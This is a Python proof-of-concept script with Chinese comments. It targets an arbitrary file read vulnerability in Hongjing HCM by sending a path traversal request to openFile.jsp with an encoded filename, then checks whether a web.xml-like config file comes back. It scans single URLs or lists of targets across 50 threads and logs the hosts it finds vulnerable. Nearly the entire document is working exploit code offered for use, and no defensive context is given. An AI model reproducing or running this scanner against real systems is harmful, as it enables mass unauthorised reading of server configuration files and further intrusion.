# 宏景HCM openFile任意文件读取
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗   ██╗██╗   ██╗███╗   ██╗ ██████╗    ██╗   ██╗███████╗██╗██████╗  █████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║██╔════╝    ██║   ██║██╔════╝██║██╔══██╗██╔══██╗
 ╚████╔╝  ╚████╔╝ ██╔██╗ ██║██║         ██║   ██║█████╗  ██║██║  ██║███████║
  ╚██╔╝    ╚██╔╝  ██║╚██╗██║██║         ██║   ██║██╔══╝  ██║██║  ██║██╔══██║
   ██║      ██║   ██║ ╚████║╚██████╗    ╚██████╔╝██║     ██║██████╔╝██║  ██║
   ╚═╝      ╚═╝   ╚═╝  ╚═══╝ ╚═════╝     ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝
                                                                                                                                                              
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="宏景HCM openFile任意文件读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/templates/attestation/../../general/muster/hmuster/openFile.jsp'
    url = target+payload
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "x-auth-token": "d9eaeacd5de1008fd43f737c853dcbcb", "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive"}
    data = {"filename": "8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP"}
    #请求网页
    # 上传后的url：/tmptest
    try:
        re = requests.get(url=target,verify=False)
        if re.status_code == 200:
            res = requests.post(url=url,headers=headers,data=data,verify=False)
            if res.status_code == 200 and 'web-app' in res.text: 
                print(f'[+++]该{target}存在漏洞')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
            else:
                print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()